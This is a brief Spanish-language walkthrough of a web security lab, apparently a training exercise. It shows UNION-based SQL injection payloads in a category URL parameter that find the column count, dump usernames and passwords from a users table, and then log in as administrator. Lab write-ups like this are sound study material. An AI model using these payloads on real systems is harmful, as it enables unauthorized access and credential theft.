Tenemos el siguiente laboratorio:
![[Pasted image 20240517153631.png]]
Si entramos en alguna de las categorías, se marca en la url:
![[Pasted image 20240517153728.png]]
Insertamos el siguiente payload y vemos que hay 2 columnas:
```bash
category=Accessories'+UNION+SELECT+'abc','def'--
```
![[Pasted image 20240517153958.png]]
Ahora para conocer el contenido de las columnas username y password de la tabla users, usamos la siguiente query:
```bash
Accessories'+UNION+SELECT+username,+password+FROM+users--
```
![[Pasted image 20240517154105.png]]
Nos logueamos con la contraseña del usuario administrador y ya estamos dentro:
![[Pasted image 20240517154508.png]]
